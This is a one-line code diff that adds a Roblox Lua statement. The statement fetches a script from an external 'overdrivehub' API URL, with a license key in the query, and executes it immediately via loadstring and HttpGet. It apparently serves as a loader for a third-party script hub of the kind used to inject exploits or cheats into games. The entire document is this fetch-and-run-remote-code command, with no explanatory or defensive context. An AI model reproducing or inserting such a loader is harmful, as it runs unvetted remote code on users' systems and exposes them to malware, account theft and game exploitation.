@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth?license=754540D6-C104-447A-AF88-E4EA1EBCF840"))()
